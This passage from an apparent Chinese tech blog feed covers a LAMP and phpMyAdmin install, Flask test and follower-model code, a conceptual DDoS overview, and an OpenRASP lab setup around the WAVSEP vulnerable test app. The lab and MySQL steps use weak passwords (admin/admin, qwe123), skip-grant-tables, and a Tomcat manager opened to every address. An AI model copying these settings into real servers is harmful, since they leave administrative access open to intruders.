    <updated>2018-06-24T04:32:52.707Z</updated>
    
    <content type="html"><![CDATA[<h1 id="更新源"><a class="markdownIt-Anchor" href="#更新源"></a> 更新源</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/apt/source.list</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">sudo apt-get update -y</span><br></pre></td></tr></table></figure><h1 id="安装apache"><a class="markdownIt-Anchor" href="#安装apache"></a> 安装apache</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install apache2</span><br><span class="line">service apache2 status</span><br><span class="line">service apache2 restrat</span><br></pre></td></tr></table></figure><h1 id="安装php7"><a class="markdownIt-Anchor" href="#安装php7"></a> 安装php7</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install php7.0</span><br><span class="line">php -v</span><br></pre></td></tr></table></figure><h1 id="安装mysql57"><a class="markdownIt-Anchor" href="#安装mysql57"></a> 安装mysql5.7</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install mysql-server </span><br><span class="line"># 更改密码</span><br><span class="line">sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf</span><br><span class="line">---加上</span><br><span class="line">...</span><br><span class="line">skip-grant-tables </span><br><span class="line">...</span><br><span class="line">-----</span><br><span class="line"></span><br><span class="line">sudo service mysql restart </span><br><span class="line"></span><br><span class="line">mysql -u root</span><br><span class="line">use msyql;</span><br><span class="line">UPDATE user set plugin=&apos;mysql_native_password&apos; where user=&apos;root&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">update user set authentication_string = password(&apos;qwe123&apos;), password_expired = &apos;N&apos;, password_last_changed = now() where user = &apos;root&apos;;</span><br><span class="line"></span><br><span class="line">flush privileges;</span><br><span class="line"></span><br><span class="line">select user, host, plugin from user where user=&apos;root&apos;;</span><br><span class="line"></span><br><span class="line"># 改回来配置+重启</span><br><span class="line"></span><br><span class="line">mysql -u root -p qwe123</span><br></pre></td></tr></table></figure><h1 id="安装php-admin"><a class="markdownIt-Anchor" href="#安装php-admin"></a> 安装php-admin</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install phpmyadmin php-mbstring php-gettext，安装的过程中选择apache2。</span><br><span class="line"></span><br><span class="line">sudo phpenmod mcrypt</span><br><span class="line">sudo phpenmod mbstring</span><br><span class="line">修改完成之后sudo systemctl restart apache2重启apache2服务器。</span><br></pre></td></tr></table></figure><h1 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">打开浏览器</span><br><span class="line"></span><br><span class="line">http://localhost/phpmyadmin</span><br></pre></td></tr></table></figure><h1 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> Reference</h1><p><a href="https://segmentfault.com/a/1190000005786808" target="_blank" rel="noopener">https://segmentfault.com/a/1190000005786808</a></p><p><a href="https://stackoverflow.com/questions/39281594/error-1698-28000-access-denied-for-user-rootlocalhost" target="_blank" rel="noopener">https://stackoverflow.com/questions/39281594/error-1698-28000-access-denied-for-user-rootlocalhost</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;更新源&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#更新源&quot;&gt;&lt;/a&gt; 更新源&lt;/h1&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span
      
    
    </summary>
    
      <category term="php" scheme="http://yoursite.com/categories/php/"/>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Flask08 - unittest</title>
    <link href="http://yoursite.com/2018/06/19/Flask08-unittest/"/>
    <id>http://yoursite.com/2018/06/19/Flask08-unittest/</id>
    <published>2018-06-18T16:08:54.000Z</published>
    <updated>2018-06-20T15:51:53.302Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>不可缺少的单元测试！ 使用unittest框架测试web应用的功能</p></blockquote><h1 id="代码"><a class="markdownIt-Anchor" href="#代码"></a> 代码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">from datetime import datetime,timedelta</span><br><span class="line">import unittest</span><br><span class="line">from microblogapp import app,db</span><br><span class="line">from microblogapp.models import User,Post</span><br><span class="line"></span><br><span class="line">class UserModelClass(unittest.TestCase):</span><br><span class="line">    def setUp(self):</span><br><span class="line">        db.create_all()</span><br><span class="line"></span><br><span class="line">    def tearDown(self):</span><br><span class="line">        db.session.remove()</span><br><span class="line">        db.drop_all()</span><br><span class="line"></span><br><span class="line">    def test_password(self):</span><br><span class="line">        u = User(username=&apos;johnw&apos;)</span><br><span class="line">        hash1 = u.set_password_hash(&apos;cat&apos;)</span><br><span class="line">        self.assertTrue(u.check_password_hash(&apos;cat&apos;))</span><br><span class="line">        self.assertFalse(u.check_password_hash(&apos;dog&apos;))</span><br><span class="line"></span><br><span class="line">    def test_follow(self):</span><br><span class="line">        u1 = User(username=&apos;susan&apos;)</span><br><span class="line">        u2 = User(username=&apos;chris&apos;)</span><br><span class="line"></span><br><span class="line">        db.session.add(u1)</span><br><span class="line">        db.session.add(u2)</span><br><span class="line"></span><br><span class="line">        u1.follow(u2)</span><br><span class="line">        db.session.commit()</span><br><span class="line"></span><br><span class="line">        self.assertTrue(u1.is_following(u2))</span><br><span class="line">        self.assertEqual(u1.followed.count(),1)</span><br><span class="line">        self.assertEqual(u2.followers.count(),1)</span><br><span class="line">        self.assertEqual(u1.followed.first().username,&apos;chris&apos;)</span><br><span class="line">        self.assertEqual(u2.followers.first().username,&apos;susan&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def test_follow_post(self):</span><br><span class="line">        u1 = User(username=&apos;john&apos;)</span><br><span class="line">        u2 = User(username=&apos;susan&apos;)</span><br><span class="line">        u3 = User(username=&apos;jack&apos;)</span><br><span class="line">        u4 = User(username=&apos;chris&apos;)</span><br><span class="line"></span><br><span class="line">        now = datetime.now()</span><br><span class="line">        p1 = Post(body=&apos;Post from john&apos;,author=u1,timestamp=now+timedelta(seconds=1))</span><br><span class="line">        p2 = Post(body=&apos;Post from susan&apos;,author=u2,timestamp=now+timedelta(seconds=4))</span><br><span class="line">        p3 = Post(body=&apos;Post from jack&apos;,author=u3,timestamp=now+timedelta(seconds=2))</span><br><span class="line">        p4 = Post(body=&quot;Post from chris&quot;,author=u4,timestamp=now+timedelta(seconds=3))</span><br><span class="line"></span><br><span class="line">        db.session.add_all([u1,u2,u3,u4])</span><br><span class="line">        db.session.add_all([p1,p2,p3,p4])</span><br><span class="line"></span><br><span class="line">        u1.follow(u2) # john follow susan </span><br><span class="line">        u1.follow(u4) # john follow chris</span><br><span class="line">        u2.follow(u3) # susan follow jack</span><br><span class="line">        u3.follow(u4) # jack follow chris</span><br><span class="line">        </span><br><span class="line">        db.session.commit()</span><br><span class="line"></span><br><span class="line">        f1 = u1.followed_posts().all()</span><br><span class="line">        f2 = u2.followed_posts().all()</span><br><span class="line">        f3 = u3.followed_posts().all()</span><br><span class="line">        f4 = u4.followed_posts().all()</span><br><span class="line"></span><br><span class="line">        self.assertEqual(f1,[p2,p4,p1])</span><br><span class="line">        self.assertEqual(f2,[p2,p3])</span><br><span class="line">        self.assertEqual(f3,[p4,p3])</span><br><span class="line">        self.assertEqual(f4,[p4])</span><br><span class="line"></span><br><span class="line">if &quot;__main__&quot; == __name__:</span><br><span class="line">    unittest.main(verbosity=2)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;不可缺少的单元测试！ 使用unittest框架测试web应用的功能&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=
      
    
    </summary>
    
      <category term="Flask" scheme="http://yoursite.com/categories/Flask/"/>
    
    
      <category term="Flask" scheme="http://yoursite.com/tags/Flask/"/>
    
  </entry>
  
  <entry>
    <title>Flask07 - 数据库多对多关系</title>
    <link href="http://yoursite.com/2018/06/19/Flask07-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%9A%E5%AF%B9%E5%A4%9A%E5%85%B3%E7%B3%BB/"/>
    <id>http://yoursite.com/2018/06/19/Flask07-数据库多对多关系/</id>
    <published>2018-06-18T16:08:05.000Z</published>
    <updated>2018-06-20T15:52:04.688Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>简述如何实现关注与被关注的业务逻辑。涉及到数据库多对多的关系</p></blockquote><h1 id="数据库关系"><a class="markdownIt-Anchor" href="#数据库关系"></a> 数据库关系</h1><ol><li>一对多的关系</li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">post</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">一个<span class="title">user</span>可以写多篇的<span class="title">post</span>，但是一个<span class="title">post</span>只能由一个<span class="title">user</span>写出来</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">所以，</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">post</span> 存储 <span class="title">user_id</span></span></span><br><span class="line">user_id = db.Column(db.Integer,db.ForeignKey('user.id'))</span><br><span class="line"></span><br><span class="line">----------</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> 存储 <span class="title">relationship</span></span></span><br><span class="line">posts = db.relationship('Post',backref='author',lazy='dynamic')</span><br></pre></td></tr></table></figure><ol start="2"><li>多对多的关系</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">假设有两个表： 老师 - 学生</span><br><span class="line"></span><br><span class="line">一个学生有多个老师</span><br><span class="line">一个老师有多个学生</span><br><span class="line"></span><br><span class="line">需要第三个辅助表：</span><br><span class="line"></span><br><span class="line">student_teacher:</span><br><span class="line">student_id</span><br><span class="line">teacher_id</span><br><span class="line"></span><br><span class="line">对于follower 和 followed 针对的都是 User 这个类</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 首先建立一个辅助表</span><br><span class="line">followers = db.table(</span><br><span class="line">    <span class="comment"># 关注了哪些user</span></span><br><span class="line">    db.Column(<span class="string">'follower_id'</span>,db.Integer,db.ForeignKey(<span class="string">'user.id'</span>)),</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 被哪些user关注</span></span><br><span class="line">    db.Column(<span class="string">'followed_id'</span>,db.Integer,db.ForeignKey(<span class="string">'user.id'</span>))</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 开始在模型中建立关系</span><br><span class="line"> <span class="comment"># 关注了哪些偶像</span></span><br><span class="line">followed = db.relationship(<span class="string">'User'</span>,secondary=followers,</span><br><span class="line">    <span class="comment"># 这个人的id，也就是追随者的id</span></span><br><span class="line">    primaryjoin=(followers.c.follower_id == id),</span><br><span class="line">    <span class="comment"># 这个是偶像的id，也是被追随者的id</span></span><br><span class="line">    secondaryjoin=(followers.c.followed_id == id),</span><br><span class="line">    backref=db.backref(<span class="string">'followers'</span>,lazy=<span class="string">'dynamic'</span>),lazy=<span class="string">'dynamic'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 这个时候如何创造模型：</span></span><br><span class="line"><span class="number">1.</span> 把这个<span class="class"><span class="keyword">class</span> <span class="title">user</span>当成一个主动的人。就是这个关系呢，你要去关注别人，那最好的方式就是有几个动词：</span></span><br><span class="line"><span class="class"><span class="title">follow</span> 关注别人</span></span><br><span class="line"><span class="class"><span class="title">unfollow</span> 不关注别人</span></span><br><span class="line"><span class="class"><span class="title">following</span> 是否正在关注别人</span></span><br><span class="line"><span class="class"></span></span><br><span class="line">所以这个followed==》返回的是已经关注的人的列表。偶像的列表</span><br><span class="line"></span><br><span class="line">这个relationship是个动词，这个类是主语。</span><br></pre></td></tr></table></figure><ol start="3"><li>文章用于解释的例子</li></ol><ul><li>user表</li></ul><table><thead><tr><th>user id</th><th>name</th></tr></thead><tbody><tr><td>1</td><td>john</td></tr><tr><td>2</td><td>susan</td></tr><tr><td>3</td><td>marry</td></tr><tr><td>4</td><td>davin</td></tr></tbody></table><ul><li>关注</li></ul><table><thead><tr><th>关注的人</th><th>被关注的人</th></tr></thead><tbody><tr><td>1 (john)</td><td>2 (susan)</td></tr><tr><td>1 (john)</td><td>4 (davin)</td></tr><tr><td>2 (susan)</td><td>3 (marry)</td></tr><tr><td>3 (marry)</td><td>4 (davin)</td></tr></tbody></table><ul><li>文章</li></ul><table><thead><tr><th>id(post)</th><th>text</th><th>user_id</th><th>follower_id</th><th>follwed_id</th></tr></thead><tbody><tr><td>1</td><td>text from susan</td><td>2</td><td>1 (john)</td><td>2</td></tr><tr><td>2</td><td>text from marry</td><td>3</td><td>2 (susan)</td><td>3</td></tr><tr><td>3</td><td>text from davin</td><td>4</td><td>1 (john)</td><td>4</td></tr><tr><td>4</td><td>text from davin</td><td>4</td><td>3 (marry)</td><td>4</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">我们可以看到对于这篇文章来说：</span><br><span class="line">follower_id 是追随者的id</span><br><span class="line">follwed_id 是这篇文章被用于追随的id，也就是user id</span><br><span class="line"></span><br><span class="line">所以我们可以使用</span><br><span class="line"></span><br><span class="line">Post.query.filter(followers.c.followed==Post.user_id)来找出那些有被关注的文章，</span><br><span class="line">然后使用 follower_id 来筛选哪些文章要被展示</span><br></pre></td></tr></table></figure><ol start="4"><li>union的使用</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 在时间线中展示自己的文章</span><br><span class="line"></span><br><span class="line"># 检索文章</span><br><span class="line">def followed_posts(self):</span><br><span class="line">    # 联合查询。首先查出这个文章的作者id是已经关注的，接着查询关注者id是否为本人，最后按时间降序排序</span><br><span class="line">    followed = Post.query.join(followers,(followers.c.followed_id == Post.user_id)).filter(followers.c.follower_id == self.id)</span><br><span class="line">    own = Post.query.filter_by(user_id=self.id)</span><br><span class="line">    return followed.union(own).order_by(Post.timestamp.desc())</span><br></pre></td></tr></table></figure><ol start="5"><li>将功能集成到application中</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 路由</span><br><span class="line">@app.route(&apos;/follow/&lt;username&gt;&apos;)</span><br><span class="line">@login_required</span><br><span class="line">def follow(username):</span><br><span class="line">    user = User.query.filter_by(username=username).first()</span><br><span class="line">    if user is None:</span><br><span class="line">        flash(&apos;User &quot;&#123;&#125;&quot; is not found&apos;.format(username))</span><br><span class="line">        return redirect(url_for(&apos;index&apos;))</span><br><span class="line"></span><br><span class="line">    if user == current_user:</span><br><span class="line">        flash(&apos;You can follow yourself.&apos;)</span><br><span class="line">        return redirect(url_for(&apos;index&apos;))</span><br><span class="line"></span><br><span class="line">    current_user.follow(user)</span><br><span class="line">    flash(&apos;You are following &#123;&#125;&apos;.format(username))</span><br><span class="line">    db.session.commit()</span><br><span class="line">    return redirect(url_for(&apos;user&apos;,username=username))</span><br><span class="line"></span><br><span class="line"># templates == user.html</span><br><span class="line"></span><br><span class="line">&lt;p&gt;&#123;&#123; user.follows.count() &#125;&#125; followers, &#123;&#123; user.followed.count() &#125;&#125; following&lt;/p&gt;</span><br><span class="line">&lt;a href=&quot;&#123;&#123;url_for(&apos;follow&apos;,username=user.username)&#125;&#125;&quot;&gt;follow&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;&#123;&#123;url_for(&apos;unfollow&apos;,username=user.username)&#125;&#125;&quot;&gt;unfollow&lt;/a&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;简述如何实现关注与被关注的业务逻辑。涉及到数据库多对多的关系&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;数据
      
    
    </summary>
    
      <category term="Flask" scheme="http://yoursite.com/categories/Flask/"/>
    
    
      <category term="Flask" scheme="http://yoursite.com/tags/Flask/"/>
    
  </entry>
  
  <entry>
    <title>4-DDoS了解</title>
    <link href="http://yoursite.com/2018/06/18/4-DDoS%E4%BA%86%E8%A7%A3/"/>
    <id>http://yoursite.com/2018/06/18/4-DDoS了解/</id>
    <published>2018-06-18T12:19:53.000Z</published>
    <updated>2018-06-20T15:51:37.715Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>DDoS攻击分为流量型攻击和CC攻击，<strong>流量攻击</strong>主要是发送报文侵占正常业务的带宽，阻塞整个数据中心的出口，导致正常用户的访问无法到达。<br><strong>CC攻击</strong> 主要针对某些业务频繁访问，激发大量消耗资源的数据库查询，文件IO，导致业务服务器CPU，或者IO出现瓶颈，无法提供正常的服务。</p></blockquote><h1 id="案例"><a class="markdownIt-Anchor" href="#案例"></a> 案例</h1><ol><li>TCP SYN FLOOD</li></ol><blockquote><p>一个正常的TCP需要三次握手，如下所示：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">客户端 --发送TCP SYN数据包--&gt;服务器分配控制块--返回SYN ACK数据包--&gt; 客户端 --返回 SYN ACK数据包--&gt; 服务器端--&gt; 服务器释放控制块</span><br><span class="line"></span><br><span class="line">如果客户端不返回SYN ACK数据包，或者不存在，那么就会造成TCP SYN 泛洪攻击</span><br></pre></td></tr></table></figure><ol start="2"><li>UDP FLOOD攻击</li></ol><blockquote><p>UDP 是没有连接状态的协议，因此可以发送大量的UDP请求，干扰正常应用。</p></blockquote><ol start="3"><li>反射型攻击</li></ol><blockquote><p>黑客伪造IP，向网络上大量开放特定服务的服务器进行请求，从而造成被伪造IP地址的服务器形成了DDoS攻击</p></blockquote><h1 id="解决方案"><a class="markdownIt-Anchor" href="#解决方案"></a> 解决方案</h1><p>1, 流量清洗<br>2，流量压制</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;DDoS攻击分为流量型攻击和CC攻击，&lt;strong&gt;流量攻击&lt;/strong&gt;主要是发送报文侵占正常业务的带宽，阻塞
      
    
    </summary>
    
      <category term="企业安全建设" scheme="http://yoursite.com/categories/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="企业安全建设" scheme="http://yoursite.com/tags/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
  </entry>
  
  <entry>
    <title>5-RASP安装</title>
    <link href="http://yoursite.com/2018/06/18/5-RASP%E5%AE%89%E8%A3%85/"/>
    <id>http://yoursite.com/2018/06/18/5-RASP安装/</id>
    <published>2018-06-18T12:19:39.000Z</published>
    <updated>2018-06-20T15:51:43.888Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>RASP, 一种已探针的形式，将保护引擎注入到应用服务中，可在文件，数据库，网络等多个方面，对应用进行保护，当发生敏感的行为时，可以结合上下文的请求进行判断，阻断攻击，具有<strong>低误报率，低漏报率</strong>的优点</p></blockquote><h1 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h1><blockquote><p>这里使用的是百度开源的OpenRASP进行实验。下面是实验步骤</p></blockquote><ol><li>安装tomcat服务器</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">yum install java -y</span><br><span class="line"></span><br><span class="line">下载tomcat</span><br><span class="line">https://tomcat.apache.org/download-80.cgi</span><br><span class="line"></span><br><span class="line">配置manager页面</span><br><span class="line">vim conf/tomcat-users.xml</span><br><span class="line"></span><br><span class="line">&lt;role rolename=&quot;admin&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;admin-gui&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;admin-script&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;manager-gui&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;manager-script&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;manager-jmx&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;manager-status&quot;/&gt;</span><br><span class="line">&lt;user username=&quot;admin&quot; password=&quot;admin&quot; roles=&quot;admin,admin-gui,admin-script,manager-gui,manager-script,manager-jmx,manager-status&quot;/&gt;</span><br><span class="line"></span><br><span class="line">添加远程访问</span><br><span class="line">vim conf/Catalina/localhost/manager.xml:</span><br><span class="line"></span><br><span class="line">&lt;Context privileged=&quot;true&quot; antiResourceLocking=&quot;false&quot;</span><br><span class="line">         docBase=&quot;$&#123;catalina.home&#125;/webapps/manager&quot;&gt;</span><br><span class="line">    &lt;Valve className=&quot;org.apache.catalina.valves.RemoteAddrValve&quot; allow=&quot;^.*$&quot; /&gt;</span><br><span class="line">&lt;/Context&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>下载漏洞程序</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://sourceforge.net/projects/wavsep/</span><br><span class="line">进入tomcat的manager.html页面进行deploy</span><br><span class="line"></span><br><span class="line">(因为需要数据库，这里需要安装mysql。)</span><br><span class="line"></span><br><span class="line">然后打开</span><br><span class="line">http://192.168.31.39:8080/wavsep/wavsep-install/install.jsp </span><br><span class="line"></span><br><span class="line">安装结束</span><br></pre></td></tr></table></figure><ol start="3"><li>安装openRASP</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar RaspInstall.jar -install &lt;tomcat_root&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li>restart tomcat</li></ol><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><blockquote><p>进行了漏洞测试，发现规则支持还不够强大，需要自己写一些规则，定制性高。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
